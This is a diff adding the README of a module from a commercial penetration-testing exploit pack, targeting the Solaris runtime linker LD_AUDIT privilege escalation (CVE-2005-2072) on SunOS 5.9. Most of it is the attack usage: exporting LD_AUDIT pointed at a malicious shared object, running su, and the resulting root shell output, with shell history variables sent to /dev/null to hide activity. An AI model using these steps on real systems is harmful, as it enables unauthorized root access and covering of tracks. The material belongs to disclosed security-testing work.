@@ -1,0 +1,43 @@
+D2 Exploitation Pack
+
+Copyright (c) 2007-2008 DSquare Security, LLC
+All rights reserved.
+
+License information
+---------------------
+
+See the file "LICENSE.txt" for information on the history of this
+software, terms & conditions for usage, and a DISCLAIMER OF ALL
+WARRANTIES.
+
+Description
+------------
+
+Solaris Runtime Linker LD_AUDIT Privilege Escalation Vulnerability
+
+$ export LD_AUDIT=./d2sec_ldaudit.so 
+$ su
+# id
+uid=0(root) gid=0(root)
+# set
+BASH_HISTORY=/dev/null
+HISTFILE=/dev/null
+HISTORY=/dev/null
+IFS=    
+
+MAILCHECK=600
+OPTIND=1
+PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin
+PS1=# 
+PS2=> 
+TERM=vt100
+history=/dev/null
+# 
+
+Tested on:
+	SunOS 5.9
+
+CVE Name : CVE-2005-2072
+CVE Url  : http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-2072
+
+EOF
